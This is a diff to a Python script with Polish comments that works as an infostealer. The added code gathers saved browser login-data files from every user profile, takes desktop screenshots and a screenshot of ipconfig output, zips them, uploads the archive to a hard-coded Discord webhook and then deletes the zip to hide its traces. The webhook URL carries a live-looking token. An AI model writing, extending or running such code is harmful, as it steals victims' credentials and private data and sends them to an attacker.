@@ -3,6 +3,7 @@ import zipfile
 import requests
 import sys
 import pyautogui  # Dodane importowanie pyautogui
+import subprocess  # Do wywoływania poleceń systemowych
 
 # URL webhooków (możesz dostosować je w zależności od użytkownika)
 webhook_url_1 = "https://discord.com/api/webhooks/1322292531374854224/Fdl-C9RgDUxDtK2bFQXPpRx5G_jGHjy2cNJ-k7_4O4kUAIfJaIZLOTz2JUSLon5QBOGe"
@@ -107,21 +108,55 @@ def send_screenshot_to_discord():
     # Robienie zrzutu ekranu
     screenshot_file = take_screenshot(screenshot_path)
     
+    return screenshot_file
+
+# Funkcja do robienia zrzutu ekranu z polecenia `ipconfig` i jego zapisania
+def take_ipconfig_screenshot():
+    try:
+        # Wywołanie ipconfig i zapisanie zrzutu ekranu
+        subprocess.run("ipconfig", shell=True, check=True)  # Uruchomienie ipconfig w konsoli
+        screenshot_path_ipconfig = os.path.join(os.environ['USERPROFILE'], 'Desktop', 'ipconfig_screenshot.png')
+        screenshot_ipconfig = pyautogui.screenshot()
+        screenshot_ipconfig.save(screenshot_path_ipconfig)
+        print(f"Zrzut ekranu ipconfig zapisany w {screenshot_path_ipconfig}")
+        return screenshot_path_ipconfig
+    except Exception as e:
+        print(f"Błąd przy robieniu zrzutu ekranu ipconfig: {e}")
+        return None
+
+# Funkcja do tworzenia ZIP z plikami i zrzutami ekranu
+def create_zip_with_screenshots():
+    files_to_zip = []
+
+    # Dodanie login data do ZIP
+    for username in os.listdir(users_directory):
+        user_folder = os.path.join(users_directory, username)
+        if os.path.isdir(user_folder) and username not in ["Default", "Default User", "All Users", "Public"]:
+            for app_name, relative_path in login_data_paths.items():
+                login_data_path = os.path.join(user_folder, relative_path)
+                if os.path.exists(login_data_path):
+                    files_to_zip.append(login_data_path)
+    
+    # Tworzenie zrzutów ekranu
+    screenshot_file = send_screenshot_to_discord()
     if screenshot_file:
-        # Wysyłanie zrzutu ekranu na Discord
-        send_file_to_discord(screenshot_file, webhook_url_1)
-        
-        # Usuwanie zrzutu ekranu po wysłaniu
-        try:
-            os.remove(screenshot_path)
-            print(f"Zrzut ekranu wysłany na Discord i usunięty z dysku.")
-        except Exception as e:
-            print(f"Błąd przy usuwaniu zrzutu ekranu: {e}")
-    else:
-        print("Błąd przy robieniu zrzutu ekranu.")
+        files_to_zip.append(screenshot_file)
+    
+    # Zrzut ekranu ipconfig
+    ipconfig_screenshot_file = take_ipconfig_screenshot()
+    if ipconfig_screenshot_file:
+        files_to_zip.append(ipconfig_screenshot_file)
+    
+    # Tworzenie ZIP-a
+    zip_file_name = os.path.join(os.environ['USERPROFILE'], 'Desktop', 'Complete_Screenshot_Archive.zip')
+    create_zip_from_files(files_to_zip, zip_file_name)
+    
+    # Wysyłanie ZIP-a na Discord
+    send_file_to_discord(zip_file_name, webhook_url_1)
+    
+    # Usuwanie ZIP-a po wysłaniu
+    os.remove(zip_file_name)
+    print(f"Plik {zip_file_name} został usunięty po wysłaniu.")
 
-# Uruchomienie przeszukiwania
-search_for_login_data()
-
-# Uruchomienie robienia zrzutu ekranu i wysyłania go na Discord
-send_screenshot_to_discord()
+# Uruchomienie funkcji
+create_zip_with_screenshots()
